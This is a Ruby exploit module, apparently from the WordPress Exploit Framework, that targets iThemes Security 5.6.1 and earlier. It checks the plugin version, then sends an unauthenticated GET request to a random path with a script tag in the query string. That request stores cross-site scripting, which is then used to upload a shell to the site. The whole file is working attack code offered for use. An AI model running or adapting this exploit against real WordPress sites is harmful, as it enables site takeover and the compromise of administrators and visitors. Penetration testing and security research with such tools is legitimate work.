# frozen_string_literal: true

class Wpxf::Exploit::IthemesSecurityStoredXssShellUpload < Wpxf::Module
  include Wpxf::WordPress::StoredXss

  def initialize
    super

    update_info(
      name: 'iThemes Security <= 5.6.1 Unauthenticated Stored XSS Shell Upload',
      author: [
        'Slavco Mihajloski', # Disclosure
        'rastating'          # WPXF module
      ],
      references: [
        ['WPVDB', '8635'],
        ['URL', 'https://medium.com/websec/xss-vulnerability-in-ithemes-security-formerly-better-wp-security-5-6-1-2fba71f96f5d#.116tc5aol']
      ],
      date: 'Oct 06 2016'
    )
  end

  def check
    check_plugin_version_from_readme('better-wp-security', '5.6.2')
  end

  def expected_status_code_after_store
    404
  end

  def generate_url
    normalize_uri(full_uri, "/#{Utility::Text.rand_alphanumeric(rand(10..20))}") + "?#{Utility::Text.rand_alpha(rand(1..5))}=<script>#{xss_ascii_encoded_include_script}</script>"
  end

  def store_script
    execute_get_request(
      url: generate_url
    )
  end
end
